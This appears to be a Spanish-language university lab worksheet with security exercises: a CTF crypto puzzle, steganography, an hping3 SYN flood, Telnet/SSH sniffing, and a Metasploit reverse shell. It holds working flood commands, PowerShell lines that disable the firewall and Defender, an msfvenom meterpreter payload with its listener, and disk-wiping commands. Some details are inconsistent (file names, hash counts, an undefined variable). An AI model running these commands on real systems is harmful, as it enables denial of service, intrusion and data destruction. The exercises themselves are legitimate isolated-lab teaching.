# Actividades para los ejercicios  4 al 8.

## Ejercicio 4 (Una clave y un secreto en AES)

### Objetivo

Encontrar una clave de 50 caracteres generada desde un texto oculto, identificar su hash correcto entre 100 opciones (archivo hashes.txt) y descifrar un mensaje cifrado con AES-GCM.

Lo que tienes:
- Un texto con ruido y símbolos (file.txt)
- Una lista de 100 hashes SHA-256 (hashes.txt)
- Un mensaje cifrado en AES-GCM (hex) también el código de descifrado AES-GCM. (cipher.txt)

Tareas:
1. Extracción desde el texto
    
    Debes procesar el texto siguiendo estas reglas:

- Considera **solo letras (a–z, A–Z)**  
- El texto debe interpretarse como **cíclico (loop infinito)**  
- Usa índices basados en **números primos**  
- Aplica un desplazamiento: **(índice primo - 2)**  


2. Construcción de la clave
    
    Debes construir una clave de:
- **50 caracteres**
- Usando los caracteres extraídos del texto siguiendo las reglas anteriores.

3. Reglas adicionales para la clave:
- Si la palabra se termina, vuelve a empezar desde el inicio
- La mezcla entre texto y palabra base es obligatoria

4. Selección del hash correcto:
- Calcula SHA-256 de tu clave
- Compara contra la lista de 50 hashes (hashes.txt)
- Solo uno es válido

5. Descifrado AES-GCM

    Una vez encontrada la clave correcta:

- Convierte la clave a hash SHA-256 (32 bytes)
- El mensaje cifrado está en formato HEX
- AES-GCM requiere el nonce separado correctamente


💡 Pistas (CTF hints)

### 🟢 Nivel 1

> No necesitas leer el texto como historia.

### 🟡 Nivel 2

> Los números primos no son decoración, son índices.

### 🟠 Nivel 3

> El texto no tiene final útil: se comporta como un ciclo infinito.

### 🔴 Nivel 4

> Una palabra clave está escondida dentro del proceso de construcción: **kevinmitnick**

### 🧠 Nivel 5 (código hint)
Si estás atascado, piensa en este flujo:

```python
texto -> normalizar -> filtrar letras
-> índices primos
-> acceso circular
-> construcción de clave (50 chars)
-> inserción de palabra base cíclica
-> SHA-256
-> comparar hashes
-> AES-GCM decrypt
```

Código para descifrado AES-GCM:

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os
import hashlib


# Función para derivar la clave a 32 bytes usando SHA-256
def derive_key(key):
    return hashlib.sha256(key.encode()).digest()

# Función para descifrar el mensaje usando AES-GCM

def decrypt_gcm(data, key):
    key_bytes = derive_key(key)
    aesgcm = AESGCM(key_bytes)

    nonce = data[:12]
    ciphertext = data[12:]

    return aesgcm.decrypt(nonce, ciphertext, None).decode()

key = "algunhash"
mensaje = "123"
cipher_hex = "Texto cifrado en hexadecimal aquí"
cipher_bytes = bytes.fromhex(cipher_hex)

dec = decrypt_gcm(cipher_bytes, clave)
print(dec)

print("DESCIFRADO:", dec)
```

### Hint final
```python
import hashlib
import random
import unicodedata
import math

def es_primo(n):
    if n < 2:
        return False
    for i in range(2, int(math.sqrt(n)) + 1):
        if n % i == 0:
            return False
    return True

def primos_indices(n):
    return [i for i in range(n) if es_primo(i)]
```

**Ojo**: No se vale usar fuerza bruta para encontrar la clave, el proceso de extracción y construcción es parte del desafío.

## Ejercicio 5 (El gran secreto dentro de una imagen)

Un poco de historia...

Para este ejercicio, en el GitHub hay una imagen llamada ``mao-shi.jpg``. Dentro de esta imagen se esconde un mensaje secreto. Tu tarea es descubrirlo utilizando técnicas de esteganografía.


### ¿Qué es la esteganografía? 🏞 🔍

![esteganografía](https://deividsdocs.wordpress.com/wp-content/uploads/2019/08/esteganografia-710x333.jpg)


La esteganografía es la práctica de ocultar información dentro de otro mensaje u objeto físico para evitar su detección. Se puede usar para ocultar casi cualquier tipo de contenido digital, ya sea texto, imágenes, videos o audios. Luego, dichos datos ocultos se extraen en destino.

A veces, el contenido encubierto mediante esteganografía se cifra antes de ocultarlo dentro de otro formato de archivo. Si no está cifrado, es posible que se procese de alguna manera para que sea más difícil de detectar.

Como forma de comunicación encubierta, la esteganografía se compara a veces con la criptografía. Sin embargo, no son lo mismo, ya que la esteganografía no consiste en codificar los datos al enviarlos ni en usar una clave para descodificarlos al recibirlos.

El término "esteganografía" procede de las palabras griegas "steganos" (que significa oculto o cubierto) y "graphein" (que significa escritura). Se ha practicado de diversas formas durante miles de años para mantener la privacidad de las comunicaciones. Por ejemplo, en la antigua Grecia, las personas grababan mensajes en madera y luego los ocultaban con cera. Los romanos usaban diversas formas de tintas invisibles, que podían descifrarse al aplicar luz o calor. (¿Qué Es la Esteganografía? ¿Cómo Funciona?, 2023)

### Antes de empezar...

Aquí usaremos la máquina de Kali Linux o también pueden instalar las herramientas en otra distribución de Linux. Escencialmente ocuparemos una:

- **Steghide**: Es una herramienta de línea de comandos que permite ocultar datos dentro de archivos multimedia, como imágenes o audio. También se puede usar para extraer datos ocultos de estos archivos. Steghide es compatible con varios formatos de archivo, incluyendo JPEG, BMP, WAV y AU.

Esta otra herramienta servirá para ver un secreto oculto dentro de la imagen:

- **jp2a**: Es una herramienta de línea de comandos que permite convertir archivos JPEG 2000 a otros formatos, como JPEG o PNG. También se puede usar para extraer datos ocultos de archivos JPEG 2000.

La instalación es sencilla, solo hay que abrir la terminal y escribir:

```bash
sudo apt-get update
sudo apt-get install steghide jp2a
```

Una vez hecho esto podemos empezar a buscar el mensaje oculto dentro de la imagen.

### Pasos para encontrar el mensaje oculto
- Primero, intentaremos extraer cualquier dato oculto dentro de la imagen usando Steghide. Para esto, ejecutamos el siguiente comando:

```bash
steghide extract -sf mao-shi.jpg
```
La contraseña es "eje4". Si el comando es exitoso, se extraerá un archivo llamado "secrets.sh" después darán permiso de ejecución al archivo y lo ejecutan:

```bash
chmod +x silent.sh
./secrets.sh
```

Lo curioso es que muestra la imagen en ascii art, pero hay un mensaje oculto si empezamos a jugar con el navegador y **seleccionando el texto**

> ¿Cuál es la bandera oculta dentro de la imagen?


Si alguien se pregunta "¿Podemos insertar .exe o cualquier otro archivo dentro de la imagen?" La respuesta es sí, pero dependerá del formato de la imagen y del tamaño del archivo que se quiera ocultar. Sin embargo, es importante tener en cuenta que ocultar archivos ejecutables dentro de imágenes puede ser considerado una práctica maliciosa y puede ser detectada por software antivirus o herramientas de análisis de malware.

## Ejercicio 6 (Una gran tormenta se avecina) 🌩⚠️

![img](https://cf-assets.www.cloudflare.com/slt3lc6tev37/1FIBEeoyzoa64lVGlWKaRV/3b878bb03df1729b48cd3f667cdfe3de/amplification_ddos_example.png)


Para este ejercicio, vamos otra vez con la teoría.

### ¿Qué es un ataque de denegación de servicio (DoS)?

Un ataque DDoS tiene como objetivo sitios web y servidores e interrumpe los servicios de red en un intento de agotar los recursos de una aplicación. Los autores de estos ataques desbordan un sitio con tráfico errante, lo que da lugar a una funcionalidad deficiente del sitio web o su desconexión por completo. (¿Qué Es un Ataque DDoS? | Seguridad de Microsoft, s. f.)

### Tipos de ataques DDoS
- **Ataques de volumen**: Estos ataques buscan saturar el ancho de banda del objetivo con una gran cantidad de tráfico. Ejemplos incluyen ataques de amplificación DNS y ataques de inundación UDP.

- **Ataques de protocolo**: Estos ataques explotan las vulnerabilidades en los protocolos de red para agotar los recursos del servidor. Ejemplos incluyen ataques SYN flood y ataques de fragmentación IP.

- **Ataques de capa de aplicación**: Estos ataques se dirigen a la capa de aplicación del modelo OSI, buscando agotar los recursos del servidor al enviar solicitudes maliciosas. Ejemplos incluyen ataques HTTP flood y ataques de Slowloris.


En este ejercicio vamos usar ataques de capa de aplicación, específicamente ataques HTTP flood, para simular un ataque DDoS contra un servidor web. El objetivo es comprender cómo funcionan estos ataques y cómo pueden afectar la disponibilidad de un sitio web.

OJO: Este ejercicio es solo para fines educativos y no debe ser utilizado para realizar ataques reales contra sitios web o servidores sin autorización.

### Herramientas para simular un ataque DDoS

- Máquina virtual con Debian, para que sea más real, vamos a instalar servidor Web, ftp y ssh. Para ello, antes de iniciar su máquina virtual, en VirtualBox, asegúrate de configurar la red en modo puente (bridged) para que pueda comunicarse con su máquina física.

Para instalar los páquetes necesarios en Debian, abre la terminal y ejecuta los siguientes comandos:

```bash
sudo apt-get update
sudo apt-get install apache2 vsftpd openssh-server
```

Una vez instalados los servicios, asegúrate de que estén en funcionamiento:

```bash
sudo systemctl start apache2
sudo systemctl start vsftpd
sudo systemctl start ssh
```
Para ver si están activos, puedes usar:

```bash
sudo systemctl status apache2
sudo systemctl status vsftpd
sudo systemctl status ssh
```
Y además si los puertos están abiertos:

```bash
sudo netstat -tuln | grep ':80\|:21\|:22
```

Una vez hecho esto, a que aclarar un par de detalles que pueden suceder:
- Si están usando Windows, usen otra máquina virtual con Kali u otra distribución de Linux, ya que hping3 no es compatible con Windows.
- Si están usando Linux, pueden usar la máquina física para simular el ataque DDoS, pero asegúrense de configurar la red para que pueda comunicarse con la máquina virtual de Debian.

Ya que me paso que desde la virtual no se podía hacer ping a la máquina física, entonces tuve que configurar la red en modo puente (bridged) para que ambas máquinas pudieran comunicarse entre sí aunque por las tarjetas de red de virtualbox generaban una red diferente, por eso, lo use desde mi máquina física para simular el ataque DDoS contra la máquina virtual de Debian.


Por último, para monitorear el tráfico de red y analizar los paquetes enviados durante el ataque DDoS, es recomendable instalar Wireshark en la máquina virtual de Debian. Wireshark es una herramienta de análisis de protocolos de red que permite capturar y examinar el tráfico de red en tiempo real. Para instalar Wireshark en Debian, abre la terminal y ejecuta el siguiente comando:

```bash
sudo apt-get install wireshark
```

Además si no quieren dar permisos de root a Wireshark, pueden agregar su usuario al grupo de Wireshark:

```bash
sudo usermod -aG wireshark $USER
```
Y si no pudieron crear el grupo de Wireshark, pueden hacerlo con el siguiente comando:

```bash
sudo groupadd wireshark
```
Reinicien sesión para que los cambios surtan efecto.

Si no les da permisos para capturar paquetes, pueden ejecutar Wireshark con privilegios de root:

```bash
sudo wireshark
```

Ahora sí, ya tenemos todo listo para simular un ataque DDoS contra el servidor web de la máquina virtual de Debian.

En una terminal de Debián, usen el siguiente comando par a ver la dirección IP de la máquina virtual:

```bash
ip addr
```
Por ejemplo, puede ser algo como *192.168.23.4* y esa será la dirección IP a la que le vamos a enviar el tráfico malicioso desde la física.

Bien, abran una nueva tab en su navegador y escriban la dirección IP de la máquina virtual de Debian para verificar que el servidor web esté funcionando correctamente. Deberían ver la página de bienvenida de Apache.

Si no ven la página de bienvenida, asegúrense de que el servidor Apache esté en funcionamiento y que la máquina virtual de Debian esté configurada correctamente para aceptar conexiones entrantes.

Ahora sí, vamos a simular un ataque DDoS contra el servidor web de la máquina virtual de Debian utilizando hping3. Hping3 es una herramienta de línea de comandos que permite enviar paquetes personalizados a través de la red. Hping3 se puede usar para simular ataques DDoS al enviar una gran cantidad de tráfico malicioso a un servidor web.

Para ello vamos a usar un reconocimiento de puertos y ver si esta abierto el puerto 80, luego vamos a enviar tráfico malicioso a ese puerto para simular un ataque DDoS.

Usaremos el siguiente comando para enviar tráfico malicioso al puerto 80 de la máquina virtual de Debian:

```bash
sudo hping3 --scan 1-1024 -S <IP_DEBIAN>
```

Una vez hecho esto aparecera una tabla más o menos así:

Scanning <IP_DEBIAN> (<IP_DEBIAN>), port 1-1024

1024 ports to scan, use -V to see all the replies

+------+----------+-------+-----+-----+-----+-------+

|port  |serv name | flags | ttl | id  | win | len  |

+------+----------+-------+-----+-----+-----+-------+

| 80   |http      | S     | 64  | 0   | 8192| 40    |

| 21   |ftp       | S     | 64  | 0   | 8192| 40    |

| 22   |ssh       | S     | 64  | 0   | 8192| 40    |

All replies received. Done.

Not responding ports:


Ya acabamos con la fase de reconocimiento. Ahora abrimos wireshark, escogemos la interfaz de red que estamos usando si es en máquina virtual sería la eth0 o eth1, pero si es en la máquina física, sería la interfaz de red que esté conectada a la misma red que la máquina virtual de Debian. 

Iniciamos la captura de paquetes. Después ahora sí podemos usar el siguiente comando para simular un ataque DDoS al enviar una gran cantidad de tráfico malicioso al puerto 80 de la máquina virtual de Debian:

```bash
sudo hping3 -S -V --flood -p 80  <IP_DEBIAN>
```

En el Wireshark ¿Qué es lo que está viendo? ¿Qué tipo de tráfico está llegando a la máquina virtual de Debian? ¿Cómo se ve el tráfico malicioso en comparación con el tráfico legítimo?

Paramos la captura de paquetes, e iniciamos con uno nuevo.

Ahora bien, vamos a cambiar un poco el comando agregando la siguiente bandera:

```bash
sudo hping3 -S -V --flood -p 80 --rand-source <IP_DEBIAN>
```

¿Qué es lo que está viendo ahora? ¿Cómo se ve el tráfico malicioso en comparación con el tráfico legítimo? ¿Qué diferencias hay entre este comando y el anterior?

Una rápida explicaciòn de las banderas usadas en el comando:
- `-S`: Establece el flag SYN en los paquetes TCP, lo que indica que se trata de una solicitud de conexión.
- `-V`: Muestra información detallada sobre los paquetes enviados y recibidos.
- `--flood`: Envía paquetes lo más rápido posible, sin esperar respuestas, lo que simula un ataque de denegación de servicio (DDoS).
- `-p 80`: Especifica el puerto de destino, en este caso el puerto 80, que es el puerto estándar para el tráfico HTTP.
- `--rand-source`: Genera direcciones IP de origen aleatorias para cada paquete enviado, lo que hace que el ataque sea más difícil de rastrear y bloquear, ya que el tráfico parece provenir de múltiples fuentes.

Luego, aplicamos un filtro para capturar solo el tráfico dirigido a la dirección IP de la máquina virtual de Debian y al puerto 80:

```bash
ip.addr == <IP_DEBIAN> && tcp.port == 80
```
En el Wireshark, ¿Qué es lo que está viendo ahora? ¿Cómo se ve el tráfico malicioso en comparación con el tráfico legítimo? ¿Qué diferencias hay entre este comando y el anterior?

### Notas sumamente importantes.

> [!WARNING]
> No dejen demasiado tiempo corriendo el comando de ataque DDoS, ya que puede saturar la red y afectar a otros dispositivos conectados a la misma red. E incluso su Modem o Router puede colapsar y dejar de funcionar, por lo que es recomendable detener el ataque después de unos segundos para evitar problemas de conectividad.

> [!IMPORTANT]
> Es fundamental entender que simular ataques DDoS puede tener consecuencias graves en la red y en los dispositivos afectados. Asegúrate de tener permiso explícito para realizar estas pruebas en entornos de prueba aislados. Nunca realices ataques DDoS en redes o sistemas sin autorización, ya que esto es ilegal y puede resultar en sanciones legales.

> [!NOTE]
> Para prevenir un ataque DDoS, es importante implementar medidas de seguridad como firewalls, sistemas de detección de intrusiones (IDS), y servicios de mitigación de DDoS. Además, es recomendable mantener el software actualizado y realizar auditorías de seguridad regularmente para identificar y corregir vulnerabilidades.

## Ejercicio 7 (¡Hey! No mires más de lo necesario) 🚫👀

![img](https://www.unitec.mx/hs-fs/hubfs/Imported_Blog_Media/ingenieros-en-sistemas-hackers-por-naturaleza-1-Dec-17-2022-06-49-38-2508-PM.jpg?width=780&height=408&name=ingenieros-en-sistemas-hackers-por-naturaleza-1-Dec-17-2022-06-49-38-2508-PM.jpg)

Este ejercicio es muy sencillo pero aprenderemos sobre la importancia entre una conexión remota segura y una insegura. Para ello nos fijaremos en dos protocolos de conexión remota: Telnet y SSH.

### Telnet

Telnet solo sirve para acceder en modo terminal, es decir, sin gráficos, pero es una herramienta muy útil para arreglar fallos a distancia, sin necesidad de estar físicamente en el mismo sitio que la máquina que los tenga. También se usaba para consultar datos a distancia, como datos personales en máquinas accesibles por red, información bibliográfica, etc.

Aparte de estos usos, en general telnet se ha utilizado (y aún hoy se puede utilizar en su variante SSH) para abrir una sesión con una máquina UNIX, de modo que múltiples usuarios con cuenta en la máquina, se conectan, abren sesión y pueden trabajar utilizando esa máquina. Es una forma muy usual de trabajar con sistemas UNIX. (colaboradores de Wikipedia, 2025)

### SSH

Es el nombre de un protocolo y del programa que lo implementa cuya principal función es el acceso remoto a un servidor por medio de un canal seguro en el que toda la información está cifrada. Además de la conexión a otros dispositivos, SSH permite copiar datos de forma segura (tanto archivos sueltos como simular sesiones FTP cifradas), gestionar claves RSA para no escribir contraseñas al conectar a los dispositivos y pasar los datos de cualquier otra aplicación por un canal seguro tunelizado mediante SSH y también puede redirigir el tráfico del (Sistema de Ventanas X) para poder ejecutar programas gráficos remotamente. El puerto TCP asignado es el 22. (colaboradores de Wikipedia, 2026)


### Preparando el entorno

Para este ejercicio, ocuparemos 3 máquinas, dos virtuales y una física. En la máquina virtual de Debian, vamos a instalar lo necesario para Telnet y SSH, para ello, abrimos la terminal y ejecutamos los siguientes comandos:

```bash
sudo apt-get update
sudo apt install -y xinetd telnetd telnet openssh-server
``` 
Una vez instalado, vamos a configurar el servicio de Telnet para que se inicie automáticamente al arrancar la máquina virtual. Para ello, editamos el archivo de configuración de xinetd:

```bash
sudo nano /etc/xinetd.d/telnet
```
Usamos esta configuración para el servicio de Telnet:

```
service telnet
    {
        disable = no
        flags = REUSE
        socket_type = stream
        wait = no
        user = root
        server = /usr/sbin/telnetd
        log_on_failure += USERID
    }
```
Una vez hecho esto, guardamos el archivo y reiniciamos el servicio de xinetd para que los cambios surtan efecto:

```bash
sudo systemctl restart xinetd.service
```

Vemos si el servicio de Telnet está en funcionamiento:

```bash
sudo systemctl status xinetd.service
```

Ahora en Kali Linux ya exite la herramienta de Telnet, SSH y Wireshark. Por tanto, abrimos Wireshark y seleccionamos la interfaz de red que estamos usando para capturar el tráfico de red. Luego, aplicamos un filtro para capturar solo el tráfico dirigido a la dirección IP de la máquina virtual de Debian y al puerto 23 (Telnet):

```bash
ip.addr == <IP_DEBIAN> && tcp.port == 23
```
o también:

```bash
telnet
```

En otra terminal de Kali Linux, usamos el siguiente comando para conectarnos a la máquina virtual de Debian utilizando Telnet:

```bash
telnet <IP_DEBIAN>
```
Aparecer algo como esto:
```
Trying X.X.X.X...
Connected to X.X.X.X.
Escape character is '^]'.

Linux 6.12.74+deb13+1-amd64 (debian) (pts/0)

debian login: 
Password: 
```

Ingresamos el nombre de usuario y la contraseña para iniciar sesión en la máquina virtual de Debian. Una vez que hayamos iniciado sesión, podemos ejecutar algunos comandos para verificar que estamos conectados correctamente. Por ejemplo, podemos usar el comando `ls` para listar los archivos en el directorio actual o el comando `uname -a` para ver información sobre el sistema operativo.

Finalmente, en el Wireshark, ¿Qué es lo que está viendo? ¿Cómo se ve el tráfico de Telnet en comparación con el tráfico de SSH? ¿Qué diferencias hay entre ambos protocolos en términos de seguridad?

Hint: Para ver algo interesante en el tráfico de Telnet, pueden usar el siguiente filtro en Wireshark:
- Da click en el último paquete de Telnet que se ha enviado, luego da click derecho y selecciona "Follow" -> "TCP Stream". ¿Qué es lo que está viendo? ¿Qué información se puede extraer del tráfico de Telnet?


Para SSH, vamos a trabajar con la máquina física en este caso si tienes Windows, Linux o MacOS, ya que es más fácil usar el cliente SSH desde la máquina física. 

Abrimos el Wireshark y seleccionamos la interfaz de red que estamos usando para capturar el tráfico de red. Luego, aplicamos un filtro para capturar solo el tráfico dirigido a la dirección IP de la máquina virtual de Debian y al puerto 22 (SSH):

```bash
ip.addr == <IP_DEBIAN> && tcp.port == 22
```
o también:
```bash
ssh
```
Ahora, en la terminal de tu máquina física, usamos el siguiente comando para conectarnos a la máquina virtual de Debian utilizando SSH:

```bash
ssh <USUARIO>@<IP_DEBIAN>
```
Aparecer algo como esto:
```The authenticity of host '<IP_DEBIAN> (<IP_DEBIAN>)' can't be established
ECDSA key fingerprint is SHA256:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '<IP_DEBIAN>' (ECDSA) to the list of known hosts.
<USUARIO>@<IP_DEBIAN>'s password: 
```
Ingresamos la contraseña para iniciar sesión en la máquina virtual de Debian. Una vez que hayamos iniciado sesión, podemos ejecutar algunos comandos para verificar que estamos conectados correctamente. Por ejemplo, podemos usar el comando `ls` para listar los archivos en el directorio actual o el comando `uname -a` para ver información sobre el sistema operativo.

Igualmente en el Wireshark, ¿Qué es lo que está viendo? ¿Cómo se ve el tráfico de SSH en comparación con el tráfico de Telnet? ¿Qué diferencias hay entre ambos protocolos en términos de seguridad?


## Ejercicio 8 (Un clic, una sentencia) 💀

**OJO**: Absolumente está estrictamente prohibido realizar ataques de ransomware o cualquier otro tipo de ataque malicioso en sistemas reales o sin autorización. Este ejercicio es solo para fines educativos y debe realizarse en un entorno controlado y seguro, como una máquina virtual o un laboratorio de pruebas.

Vamos a hacer un reverse-shell con un payload de ransomware, pero no se preocupen, el payload no hará nada malicioso, solo simulará el comportamiento de un ransomware para fines educativos.

Para ello ocuparemos la máquina virtual de Kali Linux y Windows. Para ello vamos a desactivar el antivirus de Windows, ya que el payload de ransomware será detectado como una amenaza por el antivirus. Recuerden volver a activar el antivirus después de realizar este ejercicio.

Para seguridad de todos, el payload se va transportar por ssh, suponiendo que la victima tiene un servidor SSH en su máquina, lo cual es común en entornos empresariales. Si no tienen un servidor SSH en la máquina víctima, pueden usar otro método de transporte, como correo electrónico o una unidad USB.

Ahora bien, aquí empezamos a cerrar todo por seguridad. En la máquina de Windows cambiará por un momento a NAT para que no tenga acceso a Internet, y así evitar que el payload de ransomware pueda comunicarse con un servidor de comando y control (C2) en Internet. Además, vamos a configurar un firewall para bloquear todas las conexiones entrantes y salientes en la máquina de Windows, excepto las conexiones SSH desde la máquina de Kali Linux.

Primero ejecutaremos la Powershell como administrador en la máquina de Windows y ejecutamos el siguiente comando para deasctivar el firewall:

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```
Y descativaremos el antivirus de Windows Defender:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
``` 

También a que hacerlo desde la interfaz gráfica de Windows, ya que el comando anterior no siempre funciona. Para ello, abrimos el "Centro de seguridad de Windows Defender", luego vamos a "Protección contra virus y amenazas", después a "Configuración de antivirus y protección contra amenazas" y desactivamos la opción de "Protección en tiempo real".

Ahora falta descarga el serivicio de ssh server para windows, igual desde la powershell ejecutamos el siguiente comando para instalar el servidor SSH:

```powershell
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~
```
Una vez instalado, iniciamos el servicio de SSH:

```powershell
Start-Service sshd
```
Y configuramos el servicio de SSH para que se inicie automáticamente al arrancar la máquina:
```powershell
Set-Service -Name sshd -StartupType 'Automatic'
```

Ahora bien, una vez hecho esto, en VirtualBox, vamos a cambiar la configuración de red de la máquina de Windows a "Red Interna" para que solo pueda comunicarse con la máquina de Kali Linux. El nombre de la red interna será "MyHackingLab".

Ahora en Kali Linux a que configurar el SSH para que pueda comunicarse con la máquina de Windows. Para ello, editamos el archivo de configuración de SSH:

```bash
sudo systemctl start ssh
sudo systemctl enable ssh
```

Falta configurar la IP de Kali Linux para que esté en la misma red interna que la máquina de Windows. Para ello, editamos el archivo de configuración de red:

```bash
sudo ip addr add <IP_KALI>/24 dev eth0
```
Les sugiero que sea 10.0.0.1 para Kali Linux y Windows 10.0.0.2 para que estén en la misma red interna. Por el otro lado, para windows se van a la configuración -> Red e Internet > Ethernet > Cambiar opciones del adaptador > Click derecho en el adaptador de red > Propiedades > Protocolo de Internet versión 4 (TCP/IPv4) > Propiedades > Usar la siguiente dirección IP > Dirección IP: 10.0.0.1, Máscara de subred: 255.255.255.0, Puerta de enlace predeterminada:En blanco > Aceptar.


Ahora, en la terminal de Kali Linux, usamos el siguiente comando para conectarnos a la máquina de Windows utilizando SSH:

```bash
ssh <USUARIO>@<IP_WINDOWS>
```
Aparecer algo como esto:
```The authenticity of host '<IP_WINDOWS> (<IP_WINDOWS>)' can't be established.
ECDSA key fingerprint is SHA256:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '<IP_WINDOWS>' (ECDSA) to the list of known hosts.
<USUARIO>@<IP_WINDOWS>'s password:
```
Ingresamos la contraseña para iniciar sesión en la máquina de Windows. Una vez que hayamos iniciado sesión, podemos ejecutar algunos comandos para verificar que estamos conectados correctamente. Por ejemplo, podemos usar el comando `dir` para listar los archivos en el directorio actual o el comando `systeminfo` para ver información sobre el sistema operativo.

Ahora abrimos una nueva terminal en Kali Linux y creamos un payload de ransomware utilizando la herramienta `msfvenom` de Metasploit. El payload se llamará "ransomware.exe" y se guardará en el directorio "/tmp".

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f exe > /tmp/ransomware.exe
```
Una vez creado el payload, lo transferimos a la máquina de Windows utilizando SCP (Secure Copy Protocol):

```bash
scp usuario@ip-del-servidor:/home/usuario/ransomware.exe C:\Users\TuUsuario\Desktop
```
Ingresamos la contraseña para transferir el archivo a la máquina de Windows.

Ahora, en la terminal de Kali Linux, iniciamos el listener de Metasploit para esperar la conexión del payload de ransomware:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <IP_KALI>; set LPORT 4444; exploit"
```
Finalmente, en la terminal de Windows, ejecutamos el payload de ransomware:

```powershell
C:\Users\TuUsuario\Desktop\ransomware.exe
```
Una vez ejecutado el payload, deberíamos ver una conexión entrante en el listener de Metasploit en Kali Linux. Esto simula el comportamiento de un ransomware, ya que el payload se conecta a un servidor de comando y control (C2) para recibir instrucciones y enviar información robada.

Alguna pregunta para reflexionar: ¿Qué medidas de seguridad se podrían implementar para prevenir este tipo de ataques de ransomware? ¿Cómo se podría detectar y mitigar un ataque de ransomware en una red empresarial?


### Borrado con estilo.
En las máquinas virtuales después de realizar el ejercicio y nunca vamos a volver a userlas, vamos a borrar el sistema con estilo.
**Ojo**: Este paso es irreversible, así que asegúrate de que no necesitas nada de las máquinas virtuales antes de proceder. Además no lo hagas en tu máquina física, ya que esto borrará todo el sistema operativo y los datos almacenados en él. También no lo hagas en otra máquina que no sea tuya, ya que esto puede causar daños irreparables a la máquina y a los datos almacenados en ella.

- En Windows
```cmd
del /f /s /q C:\*.*
```
- En Linux
```bash
sudo rm -rf /* --no-preserve-root
```


# Notas para entrega.
- El informe debe ser entregado en formato PDF.
- El informe debe incluir una descripción detallada de cada ejercicio, los pasos seguidos, los resultados obtenidos y las conclusiones.
- El informe debe incluir capturas de pantalla relevantes para cada ejercicio, especialmente para los ejercicios 5, 6, 7 y 8.
- Tiene que contener capturas de pantallas sobre todos los ejercicios.
- El nombre de sus usuarios y máquinas (excepto la física) debe ser por las iniciales de su nombre y apellido, por ejemplo, si tu nombre es Juan Pérez, tu usuario y máquina virtual podrían llamarse "jperez" o "jperez-vm".


Finalmente **Entre menos ruido hagas, más escuchas**. Recuerda que la seguridad informática es un juego de sigilo y astucia, no de fuerza bruta. ¡Buena suerte!

# Fuentes
[1] ¿Qué es la esteganografía? ¿Cómo funciona? (2023, 8 febrero). /. https://latam.kaspersky.com/resource-center/definitions/what-is-steganography

[2] ¿Qué es un ataque DDoS? | Seguridad de Microsoft. (s. f.). https://www.microsoft.com/es-es/security/business/denial-of-service-attacks

[3] Colaboradores de Wikipedia. (2026, 21 febrero). Secure Shell. Wikipedia, la Enciclopedia Libre. https://es.wikipedia.org/wiki/Secure_Shell

[4] Colaboradores de Wikipedia. (2025, 21 noviembre). Telnet. Wikipedia, la Enciclopedia Libre. https://es.wikipedia.org/wiki/Telnet